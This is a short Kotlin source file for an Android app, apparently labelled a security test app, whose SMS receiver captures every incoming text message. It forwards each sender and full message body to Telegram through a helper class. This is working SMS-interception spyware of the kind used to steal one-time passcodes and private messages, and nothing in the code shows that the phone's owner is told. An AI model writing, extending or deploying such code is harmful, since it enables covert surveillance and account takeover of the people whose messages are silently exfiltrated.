package com.security.testapp

import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.provider.Telephony
import android.telephony.SmsMessage

class SmsReceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if (intent.action == Telephony.Sms.Intents.SMS_RECEIVED_ACTION) {
            val messages = Telephony.Sms.Intents.getMessagesFromIntent(intent)
            val fullMessage = messages.joinToString("") { it.displayMessageBody ?: "" }
            val sender = messages.firstOrNull()?.displayOriginatingAddress ?: "Unknown"
            val message = "<b>📩 SMS Received</b>\n" +
                    "<b>📞 From:</b> $sender\n" +
                    "<b>💬 Message:</b> <code>$fullMessage</code>"
            TelegramHelper.sendWithFallback(message, context, "HTML")
        }
    }
}
